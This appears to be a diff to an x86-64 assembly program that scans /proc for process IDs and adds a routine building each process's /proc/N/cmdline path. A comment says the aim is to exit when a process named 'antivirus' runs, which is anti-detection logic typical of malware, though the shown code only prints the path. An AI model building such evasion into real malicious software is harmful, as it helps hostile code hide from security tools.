@@ -175,9 +175,10 @@ check_process:
 			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 +18] is file type
 			jne cp_skip_file
 			mov rdi, rsi; pass fname as arg
-			call check_num_name
+			call check_num_name; we only want things like /proc/19, /proc/4219, ...
 			cmp rax, 0
 			jne cp_skip_file
+			call check_cmdline; gonna go check the cmdline file of that prog and exit if it contains the word "antivirus"
 			;do stuff here
 			cp_skip_file: 
 			mov rsi, r8
@@ -203,9 +204,9 @@ check_num_name:
 	loop_cnn:
 		cmp byte[rdi + rcx], 0
 		je loop_cnn_exit
-		cmp byte[rdi + rcx], 0x30
+		cmp byte[rdi + rcx], 0x30 ; '0'
 		jb loop_cnn_bad_exit
-		cmp byte[rdi + rcx], 0x39
+		cmp byte[rdi + rcx], 0x39; '9'
 		ja loop_cnn_bad_exit
 		inc rcx
 		jmp loop_cnn
@@ -215,6 +216,61 @@ check_num_name:
 
 	pop rcx
 retn
+
+; void check_cmdline(char *fname)
+check_cmdline:
+	push rcx
+	push rbx
+	push rdx
+	sub rsp, 64; buffer to contain full path such as /proc/19/cmdline
+	;First we copy /proc
+	mov byte[rsp], '/'
+	mov byte[rsp + 1], 'p'
+	mov byte[rsp + 2], 'r'
+	mov byte[rsp + 3], 'o'
+	mov byte[rsp + 4], 'c'
+	mov byte[rsp + 5], '/'
+	;now we copy fname
+	mov rcx, 6
+	xor rbx, rbx
+	loop_ccl:
+		mov dl, byte[rdi + rbx]
+		cmp dl, 0
+		je loop_ccl_exit
+		mov byte[rsp + rcx], dl
+		inc rbx
+		inc rcx
+		jmp loop_ccl
+	loop_ccl_exit:
+	; now we copy /cmdline
+	mov byte[rsp + rcx], '/'
+	inc rcx
+	mov byte[rsp + rcx], 'c'
+	inc rcx
+	mov byte[rsp + rcx], 'm'
+	inc rcx
+	mov byte[rsp + rcx], 'd'
+	inc rcx
+	mov byte[rsp + rcx], 'l'
+	inc rcx
+	mov byte[rsp + rcx], 'i'
+	inc rcx
+	mov byte[rsp + rcx], 'n'
+	inc rcx
+	mov byte[rsp + rcx], 'e'
+	inc rcx
+	;Add the final \0
+	mov byte[rsp + rcx], 0
+	; Ok now we have our full path ready to be read
+	lea rdi, [rsp]
+	call ft_puts
+	call debug
+	add rsp, 64
+	pop rdx
+	pop rbx
+	pop rcx
+retn
+
 
 ft_strlen:
 	xor rax, rax
